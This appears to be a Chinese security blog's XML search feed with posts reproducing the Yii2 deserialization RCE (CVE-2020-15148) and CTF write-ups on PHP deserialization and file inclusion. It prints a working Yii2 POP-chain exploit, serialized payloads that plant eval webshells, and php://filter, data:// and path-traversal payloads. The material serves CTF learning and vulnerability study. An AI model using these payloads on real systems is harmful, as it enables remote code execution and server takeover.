<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>yii2框架反序列化漏洞复现</title>
      <link href="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>Yii Framework是一个基于组件、用于开发大型Web应用的高性能 PHP 框架。Yii提供了今日Web 2.0应用开发所需要的几乎一切功能。Yii是最有效率的PHP框架之一。</p><p>Yii2 2.0.38 之前的版本存在反序列化漏洞，程序在调用unserialize 时，攻击者可通过构造特定的恶意请求执行任意命令，CVE编号是CVE-2020-15148</p><h2 id="环境部署："><a href="#环境部署：" class="headerlink" title="环境部署："></a>环境部署：</h2><p>下载地址：</p><pre><code>https://github.com/yiisoft/yii2/releases/tag/2.0.37//下载yii-basic-app-2.0.37.tgz</code></pre><p> 修改&#x2F;config&#x2F;web.php文件17行cookieValidationKey,值可以为任何</p><p>进入目录，执行php yii serve</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/164228.png" class=""><p>此时就可以进入<a href="http://localhost:8080/">http://localhost:8080/</a></p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/164825.png" class=""><h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p>漏洞的出发点是在<code>\yii\vendor\yiisoft\yii2\db\BatchQueryResult.php</code>文件中</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/192033.png" class=""><p>但是继续跟进close()，发现没什么利用的方法，但是这里的__dataReader是可控的，那么调用了close的方法，可以通过触发__call方法来进行利用。</p><p>全局搜索一下__call方法，在<code>\vendor\fzaninotto\faker\src\Faker\Generator.php</code>存在合适__call的方法：</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/193357.png" class=""><p>因为close是无参方法，所以__call中的<code>$method</code>是close,<code>attributes</code>为空。继续跟进format方法：</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/193848.png" class=""><p>(<code>call_user_func_array</code>：调用回调函数，并把一个数组参数作为回调函数的参数)</p><p>跟进getFormatter:</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/194251.png" class=""><p>因为$this-&gt;formatters是可控的，因此getFormatter方法的返回值也是我们可控的，因此call_user_func_array($this-&gt;getFormatter($formatter), $arguments);中，回调函数是我们可控的，但是$arguments为空，所以相当于我们现在能干两件事，可以调用yii2中任意的一个无参方法，或者调用原生php的类似phpinfo()这样的无参方法，但是第二种肯定不能RCE，因此还要在yii2中已有的无参方法中进行挖掘（直接搜索含有call_user_function的无参函数）：<br>构造正则：</p><pre><code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code></pre><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/201701.png" class=""><p>其中有两个类中的<code>run</code>方法可用：</p><p><code>yii\rest\CreateAction::run()</code>，<code>$this-&gt;checkAccess, $this-&gt;id</code>两个参数可控</p><p><code>\yii\rest\IndexAction::run()</code>，<code>$this-&gt;checkAccess, $this-&gt;id</code>两个参数可控</p><p>至此梳理一下pop链：</p><pre><code>class BatchQueryResult  -&gt;__destruct()↓↓↓class BatchQueryResult  -&gt;reset()↓↓↓class Generator  -&gt;__call()↓↓↓class Generator  -&gt;format()↓↓↓class Generator  -&gt;getFormatter()↓↓↓class IndexAction  -&gt;run()</code></pre><p>这里可以看一下其他师傅的一张图：</p><img src="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/202329.png" class=""><p>第一步：new了一个yii\db\BatchQueryResult()类，那么就会调用这个类的__construct()方法</p><p>第二步：这个类的__construct()方法会new一个Faker\Generator()类，就又会调用Faker\Generator()类的__construct()方法，并把这个对象赋值给$_dataReader变量。</p><p>第三步：Faker\Generator()类的__construct()方法会new一个yii\rest\CreateAction()类，然后又调用yii\rest\CreateAction()类的__coustrcut()方法。并调用了run方法（这里用了 call_user_func_array后面会讲到），然后赋值给$this-&gt;formatters[‘close’]。</p><p>第四步：反序列化时，类中变量的值我们是可控的；那么就可以通过yii\rest\CreateAction()类的__construct()方法中修改这些变量，将这些值改成命令，成功RCE。</p><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>这是一个反序列化利用链，所以还需要一个反序列化的入口点</p><p>在controllers目录下创建一个TestController.php:</p><pre><code>&lt;?phpnamespace app\controllers; class TestController extends \yii\web\Controller&#123;    public function actionTest($data)&#123;        return unserialize(base64_decode($data));    &#125;&#125;?&gt;</code></pre><p>大佬们的poc：</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class IndexAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;dir&#39;;        &#125;    &#125;&#125;namespace Faker &#123;    use yii\rest\IndexAction;    class Generator    &#123;        protected $formatters;        public function __construct()        &#123;            $this-&gt;formatters[&#39;close&#39;] = [new IndexAction(), &#39;run&#39;];        &#125;    &#125;&#125;namespace yii\db&#123;    use Faker\Generator;    class BatchQueryResult&#123;        private $_dataReader;        public function __construct()        &#123;            $this-&gt;_dataReader=new Generator();        &#125;    &#125;&#125;namespace&#123;    use yii\db\BatchQueryResult;    echo base64_encode(serialize(new BatchQueryResult()));&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> yii </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化</title>
      <link href="/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>php在session存储和读取时,都会有一个序列化和反序列化的过程,PHP内置了多种处理器用于存取<code>$_SESSION</code>数据,都会对数据序列化和反序列化,源码中有session_start的时候会读取session,从而进行反序列化.<br>php.ini 中默认 session.serialize_handler 为 php_serialize，而 index.php 中将其设置为 php ，这个差异就导致了 sesssion 反序列化问题。</p><pre><code>php_binary: 存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值php: 存储方式是，键名+竖线+经过serialize()函数序列处理的值php_serialize(php&gt;5.5.4): 存储方式是，经过serialize()函数序列化处理的值</code></pre><p>php有三种处理器对$_SESSION数据进行序列化和反序列化。</p><p>1、反序列化之后的内容为一个对象；</p><p>2、反序列化生成的对象里的值，由反序列化里的值提供，与原有类预定义的值无关；</p><p>3、反序列化不触发类的成员方法；需要调用方法后才能触发；</p><p> 常见魔术方法：</p><img src="/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/205313.png" class=""><p>魔术方法触发前提：魔术方法所在类（或对象）被调用</p><table><thead><tr><th>函数</th><th>触发时机</th></tr></thead><tbody><tr><td>__construct()</td><td>实例化对象时，首先会去自动执行的一个方法</td></tr><tr><td>__destruct()</td><td>在对象的所有引用被删除或者当对象被显示销毁时执行的魔术方法（实例化结束后以及反序列化时会触发）</td></tr><tr><td>__sleep()</td><td>序列化serialize()函数回显检查类中是否存在__sleep()，如果存在，该方法会先被调用，然后才执行序列化操作</td></tr><tr><td>__wakeup()</td><td>unserialize()之前会检查是否存在一个__wakeup()方法，如果存在，则会先调用__wakeup()方法</td></tr><tr><td>__tostring()</td><td>表达方式错误导致魔术方法触发（把对象当成字符串调用）</td></tr><tr><td>__invoke()</td><td>格式表达错误导致没魔术方法触发（把对象当成函数调用）</td></tr><tr><td>__call()</td><td>调用的方法不存在时触发（返回值：调用的不存在的方法的名称和参数）</td></tr><tr><td>__callStatic()</td><td>静态调用或调用成员常量时使用的方法不存在时触发（返回值：调用的不存在的方法的名称和参数）</td></tr><tr><td>__get()</td><td>调用的成员属性不存在时触发（返回值：不存在的成员属性的名称）</td></tr></tbody></table><table><thead><tr><th>函数</th><th>触发时机</th></tr></thead><tbody><tr><td>__set()</td><td>给不存在的成员属性赋值时触发（返回值：不存在的成员属性的名称和赋的值）</td></tr><tr><td>__isset()</td><td>对不可访问属性(私有的、受保护的或不存在的属性)使用isset()或empty()时，__isset()会被调用 （返回值：不存在的成员属性的名称）</td></tr><tr><td>__unset()</td><td>对不可访问属性使用unset()时触发（返回值：不存在的成员属性名称）</td></tr><tr><td>__clone()</td><td>当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化(ctfshow)</title>
      <link href="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/"/>
      <url>/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><p>这关好像和反序列化没什么关系</p><pre><code>payload ?username=xxxxxx&amp;password=xxxxxx</code></pre><h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/223653.png" class=""><p>这里让我们让反序列后的结果是ctfShowUser的实例化对象。又因为只有$this-&gt;isVip是true才能是flag，所以反序列化的内容为</p><pre><code>&lt;?phpclass ctfShowUser&#123;    public $isVip=true;&#125;$a= serialize(new ctfShowUser());//O:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;isVip&quot;;b:1;&#125;//由于cookie中将;作为截断符号，所需要编码绕过，这里采用url编码echo urlencode($a);//O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></pre><h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><p>这关需要序列化一个username或password使其反序列化后互不相同就行了</p><pre><code>&lt;?phpclass ctfShowUser&#123;    public $username=&#39;haha&#39;;    public $isVip=true;&#125;$a= serialize(new ctfShowUser());echo urlencode($a);?&gt;//运行结果O:11:&quot;ctfShowUser&quot;:2:&#123;s:8:&quot;username&quot;;s:4:&quot;haha&quot;;s:5:&quot;isVip&quot;;b:1;&#125;//url编码处理后：O%3A11%3A%22ctfShowUser%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22haha%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></pre><h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><p><code>__construct</code>当对象被创建的时候自动调用，对对象进行初始化。当所有的操作执行完毕之后，需要释放序列化的对象，触发<code>__destruct()</code>魔术方法</p><p>因此我们只需要在执行<code>__construct</code>的时候初始化backDoor类，方便我们进行命令执行的利用，之后反序列化结束后，会执行<code>__destruct()</code>,此时<code>eval($this-&gt;code);</code>等价于<code>eval(system(&#39;cat flag.php&#39;);)</code></p><pre><code>&lt;?phperror_reporting(0);class ctfShowUser&#123;    private $class = &#39;backDoor&#39;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;&#125;class backDoor&#123;    private $code=&quot;system(&#39;cat flag.php&#39;);&quot;;    public function getInfo()&#123;        eval($code);    &#125;&#125;echo urlencode(serialize(new ctfShowUser()));?&gt;</code></pre><p>最后生成反序列化的数据：</p><pre><code>O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D</code></pre><h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><p>这关多了一个正则表达式：<code>/[oc]:\d+:/i</code>。意思是过滤这两种情况：<code>o:数字:</code>与<code>c:数字:</code></p><p>只需要把O后面的数字前加个加号就可以绕过了（o:+数字:）</p><pre><code>&lt;?phpclass ctfShowUser&#123;    public $class = &#39;backDoor&#39;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125; &#125; class backDoor&#123;    public $code=&#39;system(&quot;cat f*&quot;);&#39;;&#125;$a = serialize(new ctfShowUser());$a = str_replace(&#39;O:&#39;,&#39;O:+&#39;,$a);echo urlencode($a);?&gt;//运行结果O:+11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:17:&quot;system(&quot;cat f*&quot;);&quot;;&#125;&#125;//URL处理O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D</code></pre><h3 id="web259"><a href="#web259" class="headerlink" title="web259*"></a>web259*</h3><h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><p> 这题就简单了，直接序列化一个包含”ctfshow_i_love_36D”的字符串</p><pre><code>&lt;?phpclass ctf&#123;    public $c=&quot;ctfshow_i_love_36D&quot;;&#125;$a=serialize(new ctf());echo urlencode($a);</code></pre><pre><code>payload:ctfshow&#123;3d3ba94d-0c6c-4ae8-8113-b34d15d286b9&#125;</code></pre><h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><pre><code>注意:如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。//此特性自 PHP 7.4.0 起可用。</code></pre><p><code>__destruct</code> 函数部分弱比较 <code>$this-&gt;code==0x36d</code>，因为 <code>$this-&gt;code = $this-&gt;username.$this-&gt;password;</code>，<code>username</code> 可控制，因为 <code>(int)&#39;877.php&#39; == 0x36d</code>，故传 <code>877.php</code> 即可绕过。</p><pre><code>&lt;?phpclass ctfshowvip&#123;    public $username;    public $password=&#39;&#39;;    public $code=&#39;&#39;;            public function __construct()&#123;        $this-&gt;username=&#39;877.php&#39;;        $this-&gt;password=&#39;&lt;?php eval($_POST[1]);?&gt;&#39;;                    &#125;    &#125;echo urlencode(serialize(new ctfshowvip()));?&gt;</code></pre><pre><code>payload: vip=O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A4%3A%22code%22%3Bs%3A0%3A%22%22%3B%7D</code></pre><h3 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h3><p>方法1：非预期</p><p>因为message.php页面中的cookie我们是可控的，所以我们可以直接将序列化加密之后的字符串赋值给cookie即可。</p><pre><code>&lt;?php class message&#123;    public $token=&#39;admin&#39;;&#125;echo urlencode(base64_encode(serialize(new message(1,2,3))));</code></pre><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/223637.png" class=""><p>方法2：<strong>php反序列化字符串逃逸</strong></p><pre><code>字符串逃逸类似于注入，逃逸有一个特征：对序列化后的字符串进行了替换、而且替换后造成了字符数量的不一致，有两种情况，一种是替换后变长，一种是替换后变短。此题将fuck替换成了loveU，所以是变长。</code></pre><p>我们先看看这个：</p><pre><code>&lt;?phpclass message&#123;    public $from=&#39;1&#39;;    public $msg=&#39;2&#39;;    public $to=&#39;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#39;;&#125;echo urlencode(serialize(new message()));//结果解码后为O:7:&quot;message&quot;:3:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:31:&quot;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;&#125;</code></pre><p>可以看到，这里的s:31:”fuck”中fuck应该是四个字符，而这里却是31个，因为这里的31个字符包含了后面的一堆字符<code>fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>，共27个字符，而要使这里的数字于字符数对应，我们就可以用到题目给的字符串替换，将fuck替换成loveU,每替换一次就会多一个字符，不难想到，如果替换27次，那么就相当于这里将后面的常量字符串数量天衣无缝的弥补上了。</p><pre><code>payload:f=1&amp;m=2&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>最后访问message.php即可</p><h3 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h3><p>用扫描器扫到了<a href="http://www.zip和check.php/">www.zip和check.php</a></p><p><a href="http://www.zip中的index.php/">www.zip中的index.php</a>:</p><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/205319.png" class=""><p>我们可以通过修改 <code>$COOKIE[&#39;limit&#39;]</code> 来控制 <code>session</code> 的内容。</p><p>inc&#x2F;inc.php:</p><pre><code>&lt;?php...ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();...class User&#123;    public $username;    public $password;    public $status;    function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function setStatus($s)&#123;        $this-&gt;status=$s;    &#125;    function __destruct()&#123;        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#39;Y-m-d H:i:s&#39;));    &#125;&#125;...</code></pre><p>我们需要知道session_start()这个函数已经这个函数所起的作用：</p><p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</p><p>这里使用 <code>ini_set</code> 指定了 <code>serialize_handler</code> 为 <code>php</code>，如果默认的 <code>serialize_handler</code> 为 <code>php_serialize</code>，就可以通过在序列化的字符串之前加 <code>|</code>，反序列化任意对象。</p><pre><code>php_binary: 存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值php: 存储方式是，键名+竖线+经过serialize()函数序列处理的值php_serialize(php&gt;5.5.4): 存储方式是，经过serialize()函数序列化处理的值</code></pre><p>注意：在 <code>php 5.5.4</code> 以前默认选择的是 <code>php</code>，<code>5.5.4</code> 之后就是 <code>php_serialize</code>，这里的 <code>php</code> 版本为 <code>7.3.11</code>，那么默认就是 <code>php_serialize</code>。</p><p>那么思路就很清晰了，首先在 <code>$COOKIE[&#39;limit&#39;]</code> 中构造 <code>|+序列化对象</code> 的字符串，访问首页写入 <code>session</code>，再通过 <code>check.php</code> 加载的 <code>inc.php</code> 中的 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> 将 <code>session</code> 以 <code>session.serialize_handler=php</code> 的格式反序列化，执行 <code>User</code> 类的 <code>__destruct</code> 方法写 <code>shell</code>。</p><p>首先构造payload:</p><pre><code>&lt;?phpclass User&#123;    public $username = &quot;c.php&quot;;    public $password = &quot;&lt;?php @eval($_POST[1]); ?&gt;&quot;;    public $status;&#125;$a = new User();$target = &#39;|&#39;.serialize($a);var_dump(urlencode(base64_encode($target)));//fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiJjLnBocCI7czo4OiJwYXNzd29yZCI7czoyNjoiPD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4iO3M6Njoic3RhdHVzIjtOO30%3D</code></pre><p>更改 <code>cookie</code> 后访问 <code>index.php</code>,然后访问check.php或inc&#x2F;inc.php进行反序列化，最后访问log-c.php传参即可</p><h3 id="web264-反序列化字符串逃逸"><a href="#web264-反序列化字符串逃逸" class="headerlink" title="web264 反序列化字符串逃逸"></a>web264 反序列化字符串逃逸</h3><p>与262关不同的是这里用的是session，所以不能非预期了</p><p>反序列化字符串逃逸：</p><pre><code>f=1&amp;m=2&amp;t=3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>访问message.php时还需要在cookie中添加msg，值任意</p><h3 id="web265-反序列化中指针引用"><a href="#web265-反序列化中指针引用" class="headerlink" title="web265 反序列化中指针引用"></a>web265 反序列化中指针引用</h3><p>token的值是一个随机值，我们要想传值给password，使其与token相等是不可能的，那么就只有把password的地址传给token，使password跟着token的改变而改变。</p><pre><code>&lt;?phpclass ctfshowAdmin&#123;    public $token=1;    public $password=1;&#125;$a = new ctfshowAdmin();$a-&gt;password=&amp;$a-&gt;token;//让passwd的值随token变echo serialize($a);//运行结果O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;i:1;s:8:&quot;password&quot;;R:2;&#125;</code></pre><h3 id="web266-php不区分类名的大小写"><a href="#web266-php不区分类名的大小写" class="headerlink" title="web266 php不区分类名的大小写"></a>web266 php不区分类名的大小写</h3><p>php中：</p><pre><code>区分大小写的： 变量名、常量名、数组索引（键名key）不区分大小写的：函数名、方法名、类名、魔术常量、NULL、FALSE、TRUE</code></pre><p>所以这道题解法呼之欲出：因为正则表达式区分了大小写，所以我们可以使用大小写绕过，然后反序列化ctfshow类，这样就不会报错，脚本正常结束之后，就很调用__destruct()魔法方法，输出flag。</p><pre><code>&lt;?phpclass Ctfshow&#123;    &#125;echo serialize(new Ctfshow());//O:7:&quot;Ctfshow&quot;:0:&#123;&#125;</code></pre><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/114148.png" class=""><h3 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h3>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含(混合)</title>
      <link href="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(%E6%B7%B7%E5%90%88)/"/>
      <url>/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(%E6%B7%B7%E5%90%88)/</url>
      
        <content type="html"><![CDATA[<h2 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h2><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>进去之后发现有个tips链接，点击链接发现是一个get传参，参数中也提示了flag.php</p><p>直接在get里面传参，用php:&#x2F;&#x2F;filter协议：</p><pre><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>base64解码后果然有flag。</p><h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>看源代码提示我们有个source.php，进入后看源码：</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(%E6%B7%B7%E5%90%88)/221220.png" class=""><p>然后看到提示hint.php，访问后得到flag在ffffllllaaaagggg下，然后开始审计一波代码。</p><p>首先它先判定了传入的是不是空或者是不是字符串，然后进行了三次白名单判断。里面涉及到mb_substr(),mb_strpos(),urldecode()三个函数。</p><p>**mb_substr(str,start,length,encoding):**返回从start位置开始的长度为length的字符串。</p><p>**mb_strpos(str,find_str,offset,encoding):**返回str中从offset(默认为0)开始第一次出现find_str的位置。</p><p>根据代码分析得到，在第一次$_page取的是从0开始到第一次出现？之间的字符串，所以我们在参数中传入一个？绕过白名单。</p><pre><code>payload:http://03b2cc85-7af4-439b-a06e-41da80ff6505.node3.buuoj.cn/index.php?file=hint.php?../../../../../ffffllllaaaagggg </code></pre><p>tips:include函数有这么一个神奇的功能：以字符‘&#x2F;’分隔（而且不计个数），若是在前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含‘&#x2F;’后面的文件——注意是最后一个‘&#x2F;’。</p><h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>这道题很皮</p><p>打开题目说“你想知道蒋璐源的秘密么？”，先看源码，有个Archive_room.php，进去之后又有个SECRET，点击之后跳转到新页面，显示“查阅结束没看清么？回去再仔细看看吧”，我们试试退回到上一步然后抓包，果然能抓到东西：</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(%E6%B7%B7%E5%90%88)/193820.png" class=""><p>访问secr3t.php</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(%E6%B7%B7%E5%90%88)/194100.png" class=""><p><strong>strstr(string <code>$haystack</code>, string <code>$needle</code>, bool <code>$before_needle</code> &#x3D; <code>false</code>): string|false</strong></p><p>返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到 <code>haystack</code> 结尾的字符串。</p><p>该函数区分大小写。如果想要不区分大小写，请使用 stristr()。</p><p>可以看到，过滤规则很简单，而且提示的flag.php没有被过滤，那我们应该会想到flag应该不会在flag.php里，但先包含flag.php看看</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(%E6%B7%B7%E5%90%88)/194620.png" class=""><p>没显示flag,我就在这里。。。可能flag被当作变量了,用php:&#x2F;&#x2F;filter看看</p><pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p>解码后出现了flag变量</p><h2 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h2><h3 id="SWPUCTF-2021-新生赛-include"><a href="#SWPUCTF-2021-新生赛-include" class="headerlink" title="[SWPUCTF 2021 新生赛]include"></a>[SWPUCTF 2021 新生赛]include</h3><p>这道题用伪协议php:&#x2F;&#x2F;filter就可以</p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含(ctfshow)</title>
      <link href="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/"/>
      <url>/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>看源码：</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/110856.png" class=""><p>直接构造?file&#x3D;flag.php，没有结果，因为只是包含了php文件，而php代码是不会显示在前端的</p><p>1.可以使用php:&#x2F;&#x2F;filter伪协议：</p><pre><code>payload：?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>2.bp抓包，给file传参?file&#x3D;php:&#x2F;&#x2F;input然后在post输出想要执行的代码</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/150032.png" class=""><p>3.也可以用data伪协议</p><pre><code>?file=data://text/plain,&lt;?php system(&#39;tac flag.php&#39;);?&gt;?file=data://text/plain,&lt;?=eval($_POST[1])?&gt;</code></pre><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>这一关用???代替了php</p><p>1.使用data协议：</p><pre><code>?file=data://text/plain,&lt;?Php system(&#39;tac flag.php&#39;);?&gt; //注意&lt;?php第一个p大写?file=data://text/plain,&lt;?= system(&#39;tac flag.php&#39;);?&gt; ?file=data://text/plain;base64,PD89IHN5c3RlbSgndGFjIGZsYWcuPz8/Jyk7Pz4=</code></pre><p>2.php:&#x2F;&#x2F;input伪协议</p><pre><code>?file=Php://input再post：&lt;?php system(&quot;tac flag.php&quot;);?&gt;</code></pre><h3 id="web80"><a href="#web80" class="headerlink" 